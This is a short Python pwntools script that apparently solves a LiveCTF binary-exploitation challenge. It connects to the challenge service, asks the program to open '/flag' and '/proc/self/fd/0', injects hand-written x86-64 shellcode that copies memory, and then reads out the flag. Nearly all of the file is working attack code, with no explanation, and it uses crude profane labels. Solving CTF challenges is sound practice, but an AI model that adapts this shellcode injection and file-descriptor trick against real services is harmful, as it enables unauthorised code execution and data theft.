from pwn import *
import time

do_it_live = True

libc = ELF("./libc.so.6", checksec=False)
prog = ELF("./challenge", checksec=False)

if do_it_live:
    context.binary = prog.path
    HOST = os.environ.get('HOST', 'localhost')
    PORT = 31337
    io  = remote(HOST, int(PORT))
else:
    context.binary = prog.path
    env = {"LD_LIBRARY_PATH":"."}
    gdbscript = '''
        file challenge
        
    '''
    io = process(["./ld-linux-x86-64.so.2", context.binary.path], env=env, stdout=PIPE, stdin=PIPE, stderr=PIPE)

         

io.sendlineafter(":", "1")
io.sendlineafter(">", "/flag")


time.sleep(1)

io.sendlineafter(":", "1")
io.sendlineafter(">", "/proc/self/fd/0")

shellshit = asm("""
    mov rax, 1
    sub rdx, 0x2000
    mov rcx, qword ptr [r14+0x360]

    add rcx, 0xc
    mov r9, 0
    mov rdi, rcx
    mov rsi, rdx
    .fuck:
    cmp r9, 100
    jg    .lol
    movsb [rdi], [rsi]
    add r9,1
    jmp .fuck
    .lol:
    ret
    """)

io.sendline(shellshit)


time.sleep(1)

io.sendlineafter(":", "1")
io.sendlineafter(">", "/proc/self/fd/0")

shellshit = asm("""
    mov rax, 1
    sub rdx, 0x2000
    mov rcx, qword ptr [r14+0x360]

    add rcx, 0xc
    mov r9, 0
    mov rdi, rcx
    mov rsi, rdx
    .fuck:
    cmp r9, 100
    jg    .lol
    movsb [rdi], [rsi]
    add r9,1
    jmp .fuck
    .lol:
    ret
    """)

io.sendline(shellshit)

io.sendlineafter("Choice:", "2")
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
io.close()
